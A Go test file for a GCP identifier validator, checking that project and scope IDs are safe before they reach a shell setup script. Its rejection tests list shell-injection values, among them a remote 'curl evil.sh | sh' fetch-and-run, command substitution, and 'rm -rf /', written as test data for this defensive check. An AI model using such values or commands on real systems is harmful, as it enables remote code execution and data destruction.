package gcp

import "testing"

func TestValidateProjectIDAcceptsRealIDs(t *testing.T) {
	for _, id := range []string{"acme-prod", "my-project-123", "abcdef", "a" + "bcde1"} {
		if err := ValidateProjectID("reader_project_id", id); err != nil {
			t.Fatalf("%q should be valid: %v", id, err)
		}
	}
}

// The whole point of the validator: a value that would break out of the shell
// quoting in setup-reader.sh must never reach the template.
func TestValidateProjectIDRejectsShellInjection(t *testing.T) {
	hostile := []string{
		`x" ; curl evil.sh | sh ; #`,
		"x$(curl evil.sh|sh)",
		"x`id`",
		"x; rm -rf /",
		"x\nrm -rf /",
		"x'y",
		"--flag-injection",
		"UPPER",
		"trailing-",
		"sh", // too short
		"",
	}
	for _, id := range hostile {
		if err := ValidateProjectID("reader_project_id", id); err == nil {
			t.Fatalf("%q must be rejected", id)
		}
	}
}

func TestValidateScopeIDByKind(t *testing.T) {
	if err := ValidateScopeID("project", "acme-prod"); err != nil {
		t.Fatalf("project id rejected: %v", err)
	}
	if err := ValidateScopeID("", "acme-prod"); err != nil {
		t.Fatalf("empty kind should default to project: %v", err)
	}
	if err := ValidateScopeID("org", "123456789012"); err != nil {
		t.Fatalf("numeric org id rejected: %v", err)
	}
	if err := ValidateScopeID("folder", "42"); err != nil {
		t.Fatalf("numeric folder id rejected: %v", err)
	}
	if err := ValidateScopeID("org", "acme-prod"); err == nil {
		t.Fatal("a non-numeric org id must be rejected")
	}
	if err := ValidateScopeID("org", `1;rm -rf /`); err == nil {
		t.Fatal("injection through an org id must be rejected")
	}
	// An unrecognised kind must fail closed, not fall through unvalidated.
	if err := ValidateScopeID("billing-account", "anything"); err == nil {
		t.Fatal("an unknown scope_kind must be rejected")
	}
}
